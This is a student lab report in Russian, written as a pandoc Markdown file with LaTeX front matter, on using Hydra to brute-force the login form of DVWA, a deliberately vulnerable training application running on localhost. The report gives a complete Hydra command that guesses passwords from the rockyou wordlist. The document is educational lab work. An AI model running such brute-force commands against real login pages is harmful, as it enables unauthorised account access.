---
## Front matter
title: "Отчёт по индивидуальному проекту №3"
subtitle: "НКНбд-01-21"
author: "Юсупов Эмиль Артурович"

## Generic otions
lang: ru-RU
toc-title: "Содержание"

## Bibliography
bibliography: bib/cite.bib
csl: pandoc/csl/gost-r-7-0-5-2008-numeric.csl

## Pdf output format
toc: true # Table of contents
toc-depth: 2
lof: true # List of figures
lot: true # List of tables
fontsize: 12pt
linestretch: 1.25
papersize: a4
documentclass: scrreprt
## I18n polyglossia
polyglossia-lang:
  name: russian
  options:
	- spelling=modern
	- babelshorthands=true
polyglossia-otherlangs:
  name: english
## I18n babel
babel-lang: russian
babel-otherlangs: english
## Fonts
mainfont: Open Sans
romanfont: Open Sans
sansfont: Open Sans
monofont: Open Sans
mainfontoptions: Ligatures=TeX
romanfontoptions: Ligatures=TeX
sansfontoptions: Ligatures=TeX,Scale=MatchLowercase
monofontoptions: Scale=MatchLowercase,Scale=0.9
## Biblatex
biblatex: true
biblio-style: "gost-numeric"
biblatexoptions:
  - parentracker=true
  - backend=biber
  - hyperref=auto
  - language=auto
  - autolang=other*
  - citestyle=gost-numeric
## Pandoc-crossref LaTeX customization
figureTitle: "Рис."
tableTitle: "Таблица"
listingTitle: "Листинг"
lofTitle: "Список иллюстраций"
lotTitle: "Список таблиц"
lolTitle: "Листинги"
## Misc options
indent: true
header-includes:
  - \usepackage{indentfirst}
  - \usepackage{float} # keep figures where there are in the text
  - \floatplacement{figure}{H} # keep figures where there are in the text
---

# Введение

## Цель работы

- Воспользоваться утилитой Hydra на DVWA в секции Brute Force.

# Выполнение работы

1. Зашли во вкладку localhost/DVWA/vulnerabilities/brute/

2. Нашли нужные для нас компоненты страницы вида input, где name принадлежит [username, password, login] и параграф ошибки.

3. Ввели команду для hydra

```bash
hydra localhost http-post-form -l login -P /usr/share/wordlists/rockyou.txt \
"/DVWA/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=login:Login failed" -V
```

4. Узнали, какие пароли успешны при данном username

# Заключение

Во время выполнения работы, мы получили практические навыки Brute Force при использовании утилиты Hydra
